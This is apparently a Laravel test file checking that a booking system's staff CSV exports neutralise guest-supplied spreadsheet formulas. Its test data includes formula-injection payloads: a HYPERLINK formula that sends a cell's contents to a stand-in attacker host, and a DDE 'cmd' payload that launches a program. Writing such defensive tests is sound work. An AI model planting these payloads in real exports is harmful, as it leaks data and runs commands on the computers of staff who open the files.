<?php

namespace Tests\Feature;

use App\Models\Admin;
use App\Models\Booking;
use App\Models\Payment;
use App\Support\SafeCsv;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Tests\TestCase;

/**
 * Phase 10 — staff CSV exports can't execute guest-supplied formulas.
 */
class CsvFormulaInjectionTest extends TestCase
{
    use RefreshDatabase;

    /** @return list<list<string>> */
    protected function parse(string $csv): array
    {
        return array_map('str_getcsv', array_values(array_filter(explode("\n", trim($csv)))));
    }

    public function test_dangerous_cells_are_neutralised(): void
    {
        foreach (['=HYPERLINK("http://evil.example","x")', '+SUM(1,2)', '-2+3', '@cmd', "\t=1+1", "\r=1+1", ' =1+1'] as $payload) {
            $this->assertSame("'".$payload, SafeCsv::cell($payload), $payload);
        }
    }

    public function test_normal_values_are_left_untouched(): void
    {
        foreach (['Sita Sharma', "Ram O'Neil", 'José Álvarez', 'NW-2026-ABC123', 'guest@example.com', '+9779812345678', '-150.00', '4500.00', '2026-10-04', ''] as $value) {
            $this->assertSame($value, SafeCsv::cell($value), $value);
        }

        $this->assertSame(3, SafeCsv::cell(3));
        $this->assertNull(SafeCsv::cell(null));
    }

    public function test_the_booking_export_neutralises_guest_supplied_formulas(): void
    {
        $admin = Admin::factory()->create();
        Booking::factory()->create([
            'customer_name' => '=HYPERLINK("http://evil.example/?d="&A1,"Click")',
            'email' => '@evil@example.com',
            'phone' => '+9779812345678',
        ]);

        $response = $this->actingAs($admin, 'admin')->get(route('admin.bookings.export'));
        $rows = $this->parse($response->streamedContent());

        $this->assertSame('\'=HYPERLINK("http://evil.example/?d="&A1,"Click")', $rows[1][2]);
        $this->assertSame("'@evil@example.com", $rows[1][3]);
        $this->assertSame('+9779812345678', $rows[1][4], 'Phone numbers are not altered.');
    }

    public function test_the_report_exports_neutralise_formulas(): void
    {
        $admin = Admin::factory()->create();
        $booking = Booking::factory()->create([
            'customer_name' => '+cmd|" /C calc"!A0',
            'status' => Booking::STATUS_CONFIRMED,
            'check_in' => now()->toDateString(),
            'check_out' => now()->addDays(2)->toDateString(),
        ]);
        Payment::factory()->for($booking)->create(['reference_id' => '=1+1']);

        $bookings = $this->parse($this->actingAs($admin, 'admin')->get(route('admin.reports.bookings.export', [
            'from' => now()->subDay()->toDateString(), 'to' => now()->addDays(3)->toDateString(),
        ]))->streamedContent());
        $this->assertSame('\'+cmd|" /C calc"!A0', $bookings[1][2]);

        $payments = $this->parse($this->actingAs($admin, 'admin')->get(route('admin.reports.payments.export'))->streamedContent());
        $this->assertSame("'=1+1", $payments[1][6]);
    }
}
